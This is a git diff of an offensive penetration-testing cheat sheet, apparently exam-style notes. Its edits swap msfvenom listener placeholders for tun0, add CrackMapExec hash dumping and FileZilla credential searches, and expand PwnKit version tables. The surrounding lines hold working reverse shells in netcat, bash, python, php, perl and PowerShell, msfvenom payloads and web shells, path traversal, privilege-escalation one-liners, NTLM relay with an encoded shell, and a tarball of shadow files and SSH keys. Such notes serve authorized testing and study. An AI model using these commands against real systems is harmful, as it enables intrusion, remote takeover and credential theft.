@@ -836,10 +836,10 @@ password[$exists]=true
 In POST body (JSON):
 
 ```json
-{"username": admin, "password": {"$ne": null} }
+{"username": "admin", "password": {"$ne": null} }
 
 // other examples
-{"username": admin, "password": {"$gt": undefined} }
+{"username": "admin", "password": {"$gt": undefined} }
 ```
 
 SQL vs Mongo injection:
@@ -884,7 +884,7 @@ username=admin&password[$regex]=pass.*
 
 On Linux, `/var/www/html/` is commonly the webroot. Other Linux options: `/usr/share/nginx/www` or `/usr/share/nginx/html`.
 
-On Windows IIS, it's `C:\inetpub\wwwroot\`.
+On Windows IIS, it's `C:\inetpub\wwwroot\`. For Windows XAMPP, it's `C:\xampp\htdocs\`
 
 Sometimes you can read [sensitive files](#sensitive-files) by changing the URL query params to point
 to a file using the relative path.
@@ -924,7 +924,8 @@ curl --path-as-is http://localhost/?page=/../../../../etc/passwd
 - `/etc/shadow` if permissions allow
 - `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
 - `.ssh/id_rsa` files under user home dir (after seeing in `/etc/passwd`)
-- other [sensitive files](#81-sensitive-files)
+	- also `id_dsa`, `id_ecdsa`, and `id_ed25519`
+- other [sensitive files](#7.1%20Sensitive%20Files)
 
 The `proc` filesystem has useful info for enumerating the host:
 
@@ -1503,7 +1504,7 @@ crackmapexec smb VICTIM_IP/24 -u 'guest' -p ''
 # enumerate hosts with SMB signing not required
 crackmapexec smb VICTIM_IP/24 --gen-relay-list ntlm-relayers.txt
 
-# basic SMB scan, smbmap
+# list shares
 smbmap -H $VICTIM_IP
 # try with '-u guest' if getting "[!] Authentication error"
 # try with '-u null -p null'
@@ -2745,12 +2746,12 @@ nc -vlnp LISTEN_PORT
 # if netcat has the -e flag:
 nc -e /bin/sh LISTEN_IP 443
 # can generate with msfvenom:
-msfvenom -p cmd/unix/reverse_netcat_gaping -f raw lport=443 lhost=LISTEN_IP
+msfvenom -p cmd/unix/reverse_netcat_gaping -f raw lport=443 lhost=tun0
 
 # if no -e flag:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTEN_IP 443 >/tmp/f
 # can generate with msfvenom:
-msfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=LISTEN_IP
+msfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=tun0
 ```
 
 **Bash Reverse Shell**
@@ -2760,7 +2761,7 @@ msfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=LISTEN_IP
 /bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'
 
 # can generate with msfvenom:
-msfvenom -p cmd/unix/reverse_bash -f raw lport=443 lhost=LISTEN_IP
+msfvenom -p cmd/unix/reverse_bash -f raw lport=443 lhost=tun0
 ```
 
 **Python Reverse Shell**
@@ -2772,7 +2773,7 @@ python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",443));[o
 python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 
 # can generate with msfvenom:
-msfvenom -p cmd/unix/reverse_python -f raw lport=443 lhost=LISTEN_IP
+msfvenom -p cmd/unix/reverse_python -f raw lport=443 lhost=tun0
 ```
 
 
@@ -2789,7 +2790,7 @@ php -r '$sock=fsockopen("LISTEN_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 perl -e 'use Socket;$i="LISTEN_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 # can generate with msfvenom:
-msfvenom -p cmd/unix/reverse_perl -f raw lport=443 lhost=LISTEN_IP
+msfvenom -p cmd/unix/reverse_perl -f raw lport=443 lhost=tun0
 ```
 
 **Powershell Reverse Shell**
@@ -2803,7 +2804,7 @@ $client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $cl
 Alternatively, you can create a PowerShell reverse shell with msfvenom:
 
 ```sh
-msfvenom -p cmd/windows/powershell_reverse_tcp -f raw -o derp.ps1 lport=443 lhost=LISTEN_IP
+msfvenom -p cmd/windows/powershell_reverse_tcp -f raw -o derp.ps1 lport=443 lhost=tun0
 ```
 
 If you convert to base64 on Linux for execution with `powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you don't mess up the UTF-16LE encoding that Windows uses:
@@ -2813,7 +2814,7 @@ If you convert to base64 on Linux for execution with `powershell -enc "BASE64ENC
 echo '$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
 
 # msfvenom version
-msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=192.168.45.192 | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
+msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
 ```
 
 Also, you can use `powercat.ps1`, a netcat equivalent in PowerShell, with "-e" support.
@@ -2889,20 +2890,20 @@ You can use `msfvenom` to generate reverse shells easily.
 
 ```sh
 # Basic Windows TCP reverse shell
-msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=ATTACKER_IP
+msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0
 
 # Basic Linux TCP reverse shell
-msfvenom -p linux/x86/shell_reverse_tcp -f elf -o derp.elf lport=443 lhost=ATTACKER_IP
+msfvenom -p linux/x86/shell_reverse_tcp -f elf -o derp.elf lport=443 lhost=tun0
 
 # web-based reverse shells
 # asp
-msfvenom -p windows/shell/reverse_tcp -f asp -o derp.asp lport=443 lhost=ATTACKER_IP
+msfvenom -p windows/shell/reverse_tcp -f asp -o derp.asp lport=443 lhost=tun0
 # jsp
-msfvenom -p java/jsp_shell_reverse_tcp -f raw -o derp.jsp lport=443 lhost=ATTACKER_IP
+msfvenom -p java/jsp_shell_reverse_tcp -f raw -o derp.jsp lport=443 lhost=tun0
 # war
-msfvenom -p java/jsp_shell_reverse_tcp -f war -o derp.war lport=443 lhost=ATTACKER_IP
+msfvenom -p java/jsp_shell_reverse_tcp -f war -o derp.war lport=443 lhost=tun0
 # php
-msfvenom -p php/reverse_php -f raw -o derp.php lport=443 lhost=ATTACKER_IP
+msfvenom -p php/reverse_php -f raw -o derp.php lport=443 lhost=tun0
 
 # Windows DLL that invokes commands you tell it:
 msfvenom -p windows/exec -f dll -o shell32.dll cmd="C:\windows\system32\calc.exe"
@@ -3330,7 +3331,7 @@ self.close();
 You can use msfvenom to generate an HTA file that will give you a reverse shell. You can either use the generated file directly or replace the top script block with a msfvenom payload:
 
 ```sh
-msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=ATTACKER_IP
+msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
 ```
 
 
@@ -3665,7 +3666,7 @@ Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104
 Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Select-String -Pattern "secret" # also try 'secur' and 'passw'
 
 # User files that may have juicy data
-powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*pst,*.ost,*.eml,*.msg,*.log -File -Recurse -ErrorAction SilentlyContinue"
+powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*.pst,*.ost,*.eml,*.msg,*.log,id_* -File -Recurse -ErrorAction SilentlyContinue"
 # alternative
 dir /a-d /s/b C:\users | findstr /ilvC:\AppData\ /C:\desktop.ini /C:\ntuser.dat /C:"\All Users\VMware" /C:"\All Users\USOShared" /C:"\All Users\Package" /C:"\All Users\Microsoft"
 
@@ -3958,7 +3959,7 @@ upload winsvc.exe to `%temp%`.
 Alternatively, create a Service EXE with msfvenom.
 
 ```sh
-msfvenom -p windows/shell_reverse_tcp -f exe-service --service-name "Derp" -o winsvc.exe lport=443 lhost=ATTACKER_IP
+msfvenom -p windows/shell_reverse_tcp -f exe-service --service-name "Derp" -o winsvc.exe lport=443 lhost=tun0
 ```
 
 Then install and invoke the service:
@@ -4067,7 +4068,7 @@ Alternatively, create the windows service binary with `msfvenom`.
 msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!
 
 # run arbitrary command - msfvenom
-msfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd="C:\Windows\Temp\nc.exe -L -p 6969 -e cmd.exe" lhost=ATTACKER_IP
+msfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd="C:\Windows\Temp\nc.exe -L -p 6969 -e cmd.exe" lhost=tun0
 ```
 
 Once compiled, transfer over to victim machine and replace the vulnerable service binary with your own.
@@ -4310,7 +4311,7 @@ dir C:\windows\microsoft.net\framework\
 wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
 
 # also generate a reverse shell
-msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=LISTEN_IP
+msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0
 
 # start a HTTP server to host the binaries
 python -m http.server 80
@@ -4414,7 +4415,7 @@ When you can't crack an NTLMv2 hash that you were able to capture with Responder
 # '-c' flag is command to run
 # here we are generating a powershell reverse shell one-liner
 # as base64-encoded command
-sudo impacket-ntlmrelayx -t VICTIM_IP -no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=LISTEN_IP | iconv -t UTF-16LE | base64 | tr -d '\n')"
+sudo impacket-ntlmrelayx -t VICTIM_IP -no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n')"
 
 # start a netcat listener to catch the reverse shell
 sudo nc -nvlp 443
@@ -4488,7 +4489,7 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
 $w = Add-Type -memberDefinition $imports -Name "derp" -namespace Win32Functions -passthru;
 
-# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=LISTEN_IP
+# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=tun0
 [Byte[]];
 [Byte[]]$s = <SHELLCODE HERE>;
 
@@ -4610,7 +4611,7 @@ with Empire)
 <!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
      shellcode, and build with 64-bit MSBuild.exe
      Building Shellcode:
-     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=YOUR_IP | tee shellcode.cs
+     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=tun0 | tee shellcode.cs
 -->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <!-- This inline task executes shellcode. -->
@@ -4803,6 +4804,12 @@ To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`
 %SYSTEMDRIVE%\sysprep.inf
 %SYSTEMDRIVE%\sysprep\sysprep.xml
 
+# FileZilla config:
+# look for admin creds in FileZilla Server.xml
+dir /s/b C:\FileZilla*.xml
+type "FileZilla Server.xml" | findstr /spin /c:admin
+type "FileZilla Server Interface.xml" | findstr /spin /c:admin
+
 # less likely, still worth looking
 %SYSTEMDRIVE%\pagefile.sys
 %WINDIR%\debug\NetSetup.log
@@ -4982,7 +4989,23 @@ hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
 
-#### 4.4.3.4 Dump Hashes and Passwords Using mimikatz
+#### 4.4.3.4 Dump Hashes and Passwords Using Crackmapexec
+
+Probably the easiest way to grab all the hashes from a box once you have admin creds or an admin hash:
+
+```sh
+# dump SAM (using PtH)
+cme smb VICTIM -u Administrator -H NTHASH --local-auth --sam
+
+# dump LSA
+cme smb VICTIM -u Administrator -p PASSWORD --local-auth --lsa
+
+# dump NTDS.dit
+cme smb VICTIM_DC -u DOMAIN_ADMIN -H NTHASH --ntds
+```
+
+
+#### 4.4.3.5 Dump Hashes and Passwords Using mimikatz
 
 [PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
 
@@ -6410,7 +6433,7 @@ cat /etc/*release
 env                # or 'set'
 ps -ef wwf
 ip a               # or ifconfig -a
-netstat -untap
+ss -untap          # or 'netstat -untap'
 w
 last
 
@@ -6567,7 +6590,10 @@ find / -type f \( -perm -u+s -o -perm -g+s \) -executable -ls 2> /dev/null
 find / -type f \( -perm -u+s -o -perm -g+s \) -perm -o+x -ls 2> /dev/null
 
 # list writable directories in PATH
-( set -o noglob; IFS=:;[ -n "${ZSH_VERSION+1}" ] && MYPATH=($(echo "$PATH"))||MYPATH="$PATH"; for p in $MYPATH; do [ -w "$p" ] && ls -ald $p; done )
+# bash, sh:
+( set -o noglob; IFS=:;for p in $PATH; do [ -w "$p" ] && ls -ald $p; done )
+# zsh:
+( set -o noglob; IFS=:; for p in ($(echo $PATH)); do [ -w "$p" ] && ls -ald $p; done )
 
 # find world-writable files and directories
 find / \( -path /sys -o -path /proc -o -path /dev \) -prune -o -perm -o+w -type d -ls 2>/dev/null
@@ -6588,11 +6614,11 @@ cat /home/*/.*history
 grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null
 
 # credential files
-ls -l /home/*/.ssh/id*  # ssh keys
+ls -l /home/*/.ssh/id_*  # ssh keys
 ls -AlR /home/*/.gnupg  # PGP keys
 ls -l /tmp/krb5*  # Kerberos tickets
 find / -type f -name *.gpg
-find / -type f -name id_rsa*
+find / -type f -name id_*
 
 
 
@@ -6649,6 +6675,10 @@ sudo -V
 # if older than 1.8.28, root privesc:
 sudo -u#-1 /bin/bash
 # or sudo -u \#$((0xffffffff)) /bin/bash
+
+
+# check for pwnkit (look for version < 0.120)
+/usr/bin/pkexec --version
 
 
 ####################################
@@ -6958,9 +6988,36 @@ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 
 Affects pkexec (polkit) < 0.120.
 
+**Detailed vulnerable versions:**  [reference](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)
+
+Check what's installed with `dpkg -s policykit-1`
+
+Ubuntu:
+
+| Ubuntu version     | Latest vulnerable version | First fixed version         |
+| ------------------ | ------------------------- | --------------------------- |
+| 14.04 LTS (Trusty) | 0.105-4ubuntu3.14.04.6    | 0.105-4ubuntu3.14.04.6+esm1 |
+| 16.04 LTS (Xenial) | 0.105-14.1ubuntu0.5       | 0.105-14.1ubuntu0.5+esm1    |
+| 18.04 LTS (Bionic) | 0.105-20                  | 0.105-20ubuntu0.18.04.6     |
+| 20.04 LTS (Focal)  | 0.105-26ubuntu1.1         | 0.105-26ubuntu1.2           |
+
+Debian:
+
+| Debian version | Latest vulnerable version | First fixed version |
+| -------------- | ------------------------- | ------------------- |
+| Stretch        | 0.105-18+deb9u1           | 0.105-18+deb9u2     |
+| Buster         | 0.105-25                  | 0.105-25+deb10u1    |
+| Bullseye       | 0.105-31                  | 0.105-31+deb11u1    |
+| (unstable)     | 0.105-31.1~deb12u1        | 0.105-31.1          |
+
+Checking for vulnerability:
+
 ```sh
-# check for vuln, must be < 0.120
-/usr/bin/pkexec --version
+# check suid bit set:
+ls -l /usr/bin/pkexec
+
+# check for vulnerable version (see above tables):
+dpkg -s policykit-1
 ```
 
 Exploit:
@@ -7088,11 +7145,11 @@ tar zcf loot.tar.gz \
 /etc/shadow{,-} \
 /etc/ssh/ssh_config \
 /etc/ssh/sshd_config \
-/home/*/.ssh/id* \
+/home/*/.ssh/id_* \
 /home/*/.ssh/authorized_keys* \
 /home/*/.gnupg \
 /root/.gnupg \
-/root/.ssh/id* \
+/root/.ssh/id_* \
 /root/.ssh/authorized_keys* \
 /root/network-secret*.txt \
 /root/proof.txt
@@ -7108,7 +7165,7 @@ are good to try to grab when you can (directory traversal, LFI, shell access).
 
 ### 7.1.1 Sensitive Files on Linux
 
-Also check out [Linux Files of Interest](#6.13%20Linux%20Files%20of%20Interest).
+Also check out [Linux Files of Interest](#6.5%20Linux%20Files%20of%20Interest).
 
 ```sh
 /etc/passwd
@@ -7116,7 +7173,7 @@ Also check out [Linux Files of Interest](#6.13%20Linux%20Files%20of%20Interest).
 # "shadow" files usually have credentials
 find / -path '/usr' -prune -o -type f -readable \( -iname 'shadow*' -o -iname '.shadow*' \) -ls 2>/dev/null
 
-# find ssh private keys
+# find ssh private keys (id_rsa, id_dsa, id_ecdsa, and id_ed25519)
 find / -xdev -type f -readable -name 'id_*' -exec grep -q BEGIN {} \; -ls 2>/dev/null
 
 # Wordpress config, can have credentials
@@ -7258,8 +7315,11 @@ git log
 # show changes for a commit
 git show COMMIT_HASH
 
-# search for sensitive keywords
+# search for sensitive keywords in current checkout
 git grep -i password
+
+# search for sensitive keywords in file content of entire commit history
+git grep -i password $(git rev-list --all)
 ```
 
 
